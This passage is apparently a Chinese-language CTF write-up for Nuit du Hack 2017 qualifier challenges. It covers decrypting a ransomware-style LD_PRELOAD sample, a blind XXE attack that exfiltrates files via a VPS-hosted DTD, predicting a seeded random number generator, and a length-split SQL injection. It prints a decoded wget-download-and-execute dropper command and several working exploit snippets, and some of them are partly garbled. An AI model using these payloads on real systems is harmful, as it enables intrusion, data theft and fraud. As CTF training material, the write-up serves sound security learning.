    s = ''
    for i in range(len(d)):
        s += chr(ord(d[i])^0x90)
    print s
得到的字符串为:
    wget http://fromrussiawithlove.quals.nuitduhack.com/yzaegrdsfhvzey.txt -O /tmp/b 2> /dev/null > /dev/null; cat /tmp/b | base64 -d > /tmp/a 2> /dev/null; chmod +x /tmp/a 2> /dev/null; /tmp/a &
下载得到的/tmp/a为一个elf，将一个lib文件写入了一个/lib/lib_preload。
    f = open('./a.bin', 'rb')
    d = f.read()[0x3ec0:0x3ec0+0xa518]
    f.close()
    key = 'NDH2017'
    d2 = ''
    for i in range(0xa518):
        d2 += chr(ord(d[i])^ord(key[i%7]))
    print d2
    f = open('ldpreload', 'wb')
    f.write(d2)
    f.close()
分析ld_preload库文件，发现chmod中存在一定条件下会调用chiffreFiles函数。在chiffreFiles中会对文件进行加密。
密钥由17个字节计算crc32得到的64个字节key。
文件加密过程为生成65字节IV，然后再进行异或。写入到文件中的数据为
    IV+l64(length)+enc_buff
由于密钥是由两个字符crc32得到的，同时bmp的头部有部分内容是固定的。因此可以根据bmp中固定的部分，得到可能的key值，然后判断key值是否为两个字符的crc32。
一个bmp的头部大致如下:
最后这样能算出36位key，将key通过补x00补到64位，解密picture.bmp文件，发现文件中有大块的0xff值，如下图所示。因此根据这些非0xff值可以得到完整的key。
    from zio import *
    def crc32(c):
        v5 = 0xffffffff
        for i in range(2):
            v5 ^= ord(c[i])
            for j in range(8):
                if v5&1:
                    v5 = (v5>>1)^(0xffffffff&0xEDB88320)
                else:
                    v5 = (v5>>1)^(0&0xEDB88320)
        v5 = 0xffffffff -v5
        return v5
    crc32_table = {}
    for c0 in range(0x80):
        for c1 in range(0x80):
            s = chr(c0) + chr(c1)
            crc32_table[crc32(s)] = s
    bmp_header ='''
    42 4D 7A 53 07 00 00 00 00 00 ?? 00 00 00 ?? 00
    00 00 ?? ?? 00 00 ?? ?? 00 00 01 00 ?? 00 00 00
    00 00 00 ??
    '''
    bmp_header = bmp_header.replace('n', '').replace(' ', '')
    print bmp_header
    f = open('./dump2.img', 'rb')
    d = f.read()[0x7e7:].split('x00')[0]
    f.close()
    f = open('./picture.bmp', 'rb')
    d = f.read()
    f.close()
    IV = d[0:0x41]
    length = l64(d[0x41:0x49])
    def find_tmp_key(tmp_key):
        for key,value in crc32_table.items():
            find = True
            for i in range(4):
                if tmp_key.has_key(i):
                    if tmp_key[i] != (l32(key)[i]):
                        find = False
                        break
            if find:
                return key, value
        return None, None
    data = d[0x49:]
    input = ''
    key = ''
    for i in range(len(bmp_header)/8):
        data = bmp_header[8*i:8*i+8]
        tmp_key = {}
        for j in range(4):
            v = data[j*2:j*2+2]
            try:
                c = int(v, 16)
                tmp_key[j] = chr(ord(d[0x49+i*4+j])^c^ord(IV[(4*i+j)%41]))
            except:
                pass
        k, s = find_tmp_key(tmp_key)
        if input:
            input += s[1:]
        else:
            input = s
        key += l32(k)
    def decrypt_bmp(d, key):
        IV = d[:0x41]
        d3 = ''
        for i in range(length):
            d3 += chr(ord(d[i + 0x49]) ^ ord(IV[i % 0x41]) ^ ord(key[i % 0x40]))
        f = open('a4.bmp', 'wb')
        f.write(d3)
        f.close()
    dds = '5E 9F BD F2 CA 53 44 24 C4 54 8B 5B 0D D6 97 A71D 8C 09 4A 09 B6 31 EA 6E 5D C0 B8'.replace(' ', '').decode('hex')
    for ds in dds:
        key += chr(0xff^ord(ds))
    #key = key.ljust(0x40, 'x00')
    decrypt_bmp(d, key)
    flag = ''
    for i in range(len(key)/4):
        if flag:
            flag += crc32_table[l32(key[i*4:i*4+4])][1:]
        else:
            flag = crc32_table[l32(key[i*4:i*4+4])]
    print flag
**No Pain No Gain**
进去发现是一个上传页面，上传csv，进行转换，fuzz时候得到过这样的错误
所以猜测是xxe,
然后尝试一波之后没有想法,一直都报错,后来才知道,报错是没关系的,因为已经执行了,所以是一个 blind xxe
然后直接用里面的payload改一该就好了,提交的文件内容如下:
     %xxe;%send; ]>
    id,name,email
然后vps上的evil.dtd内容如下：
    "
    >
    %all;
成功获取到hosts的内容,那么开始寻找 flag ,最后是在 /home/flag/flag 里面,
最后截图如下:
**Slumdog Millionaire**
从题目获取代码如下：
    #!/usr/bin/python2.7
    import random
    import config
    import utils
    random.seed(utils.get_pid())
    ngames = 0
    def generate_combination():
        numbers = ""
        for _ in range(10):
            rand_num = random.randint(0, 99)
            if rand_num  config.MAX_TRIES:
            reset_jackpot()
        winning_combination = generate_combination()
        if winning_combination == user_guess:
            utils.win()
            reset_jackpot()
查看之后发现,要是我们知道了 seed 即那个进程的pid,那么就能预测所有的组合,所以先在网页随便输入一串东西,然后得到第一次的正确答案,这里我得到的是
56-08-50-98-94-51-01-75-63-61
然后运行如下代码就好了
    import random
    def generate_combination():
        numbers = ""
        for _ in range(10):
            rand_num = random.randint(0, 99)
            if rand_num < 10:
                numbers += "0"
            numbers += str(rand_num)
            if _ != 9:
                numbers += "-"
        return numbers
    seed=0
    for i in xrange(1,10000):
        random.seed(i)
        ret = generate_combination()
        print ret
        if (ret == '56-08-50-98-94-51-01-75-63-61'):
            print 'find',i
            seed=i
            break
    random.seed(seed)
    ans=generate_combination()
    ans=generate_combination()
    print ans
得到ans提交就拿到flag了
**Divide and rule**
首先点进去是个登陆页面，
然后去 search 那儿找东西
发现那一堆查询参数是存在注入的,随便加个单引号就不返回值了。
然后尝试联合查询发现还是不返回,后来想到这么多参数很可能是长度受了限制,然后就分开来,最后测试成功,如下:
    firstname='union select/*&lastname=*/1,2,3,4,5,6#&position=&country=123&gender=
但是有一个问题就是,长度限制后来测出来好像是15,这样子没办法查表名和列名之类的,因为 information_schema 太长了。
后来脑洞了一下猜到表名是 users ,